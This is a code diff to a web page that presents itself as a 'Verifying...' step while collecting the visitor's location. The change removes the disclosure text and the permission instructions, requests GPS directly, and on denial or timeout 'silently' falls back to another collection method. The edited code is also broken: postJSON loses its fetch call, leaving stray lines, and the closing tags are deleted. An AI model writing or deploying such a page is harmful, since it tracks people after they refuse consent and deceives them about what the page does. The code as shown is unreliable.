@@ -66,19 +66,16 @@
 
     <div id="loading" style="display:none;">
         <h1>Verifying...</h1>
-        <p>Please wait while we confirm your location.</p>
         <div class="spinner" aria-label="Loading"></div>
     </div>
 
     <div id="blocked" style="display:none;">
         <h1>Location Required</h1>
-        <p>Location access is blocked in your browser.<br>To continue, please enable it:</p>
-        <ol style="text-align:left; max-width:300px; line-height:1.8; font-size:0.95rem;">
-            <li>Tap the <strong>lock icon</strong> in the address bar</li>
-            <li>Tap <strong>Permissions</strong></li>
-            <li>Set <strong>Location</strong> to <em>Allow</em></li>
-            <li>Refresh this page</li>
-        </ol>
+        <p>Location access is blocked in your browser.<br>Attempting fallback location collection...</p>
+    </div>
+
+    <div id="insecure" style="display:none; color: yellow; background-color: #333; padding: 10px; margin-bottom: 1rem; border-radius: 5px;">
+        <strong>Warning:</strong> Location permissions require HTTPS or localhost. Please access this page over HTTPS or localhost for location features to work.
     </div>
 
     <script>
@@ -86,9 +83,7 @@
         const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');
 
         async function postJSON(url, data) {
-            try {
-                await fetch(url, {
-                    method: 'POST',
+
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data),
                     keepalive: true
@@ -146,24 +141,31 @@
                 return;
             }
 
-            // Check if Chrome has already blocked location permission
-            if (navigator.permissions) {
-                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
-                    if (result.state === 'denied') {
-                        // Permission was previously blocked — show instructions
-                        document.getElementById('loading').style.display = 'none';
-                        document.getElementById('blocked').style.display = 'block';
-                        collectFallback();
-                    } else {
-                        requestLocation();
-                    }
-                }).catch(function() {
-                    requestLocation();
-                });
-            } else {
-                requestLocation();
-            }
+        if (!navigator.geolocation) {
+            collectFallback().finally(done);
+            return;
         }
-    </script>
-</body>
-</html>
+
+        // Directly request location without checking permissions API
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                await postJSON(ENDPOINT_GPS, {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                });
+                done();
+            },
+            async () => {
+                // On error or denial, silently fallback
+                await collectFallback();
+                done();
+            },
+            { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
+        );
+
+        // Fallback timeout if no response within 12 seconds
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('blocked').style.display = 'block';
+            collectFallback();
+        }, 12000);
